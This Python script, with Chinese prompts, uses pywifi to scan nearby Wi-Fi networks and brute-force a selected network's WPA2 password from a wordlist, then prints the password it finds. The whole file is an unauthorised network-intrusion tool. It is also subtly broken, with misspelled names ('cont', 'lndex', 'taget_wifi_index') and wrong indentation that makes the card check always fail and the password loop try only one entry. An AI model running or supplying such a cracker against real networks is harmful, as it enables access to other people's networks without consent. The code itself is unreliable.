import pywifi
from pywifi import const
import time

def get_card():
    wifi = pywifi.PyWiFi()
    card = wifi.interfaces()[0]
    card.disconnect()
    time.sleep(1)
    status = card.status
    if status not in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        print("网卡未处于断开状态")
    return False
    return card

def scan_wifi(card):
    print("开始扫描附近的wifi. . .")
    card.scan()
    time.sleep(8)
    wifi_list = card.scan_results()
    print("数量 : ", len(wifi_list))
    lndex = 1
    for wifi_info in wifi_list:
        print(f"{index}.SSID:{wifi_info.ssid}")
        index = index + 1
    return wifi_list

def crack_wifi(wifi_ssid, card):
    file_path = "密码文件/common.txt"
    with open(file_path, "r") as password_file:
        for pwd in password_file:
             pwd = pwd.strip()
        if connect_to_wifi(pwd, wifi_ssid, card):
                  print("密码正确", pwd)
                  return pwd
        else:
            print("密码错误", pwd)
            time.sleep(1)
            return None

def connect_to_wifi(pwd,wifi_ssid,card):
    profile = pywifi.Profile()
    profile.ssid = wifi_ssid
    profile.pwd = pwd
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    card.remove_all_network_profiles()
    tmp_profile = card.add_network_profile(profile)
    card.connect(tmp_profile)
    time.sleep(3)
    if card.status == cont.IFACE_CONNECTED:
       is_connected = True
    else:
         is_connected = False
    card.disconnect()
    time.sleep(1)
    return is_connected

card = get_card()
if not card:
    print("网卡关闭失败，请重试！")
else:
    wifi_list = scan_wifi(card)
    if not wifi_list:
        print("没有发现附近的wifi")
    else:
        taget_wifi_index = int(input("请选择要破解的wifi序号:")) - 1
        target_wifi_ssid = wifi_list[target_wifi_index].ssid
        print("开始破解wifi",target_wifi_ssid)
        result = crack_wifi(target_wifi_ssid,card)
        if result:
            print("破解成功，wifi密码是:",result)
        else:
            print("破解失败，未找到正确的密码！")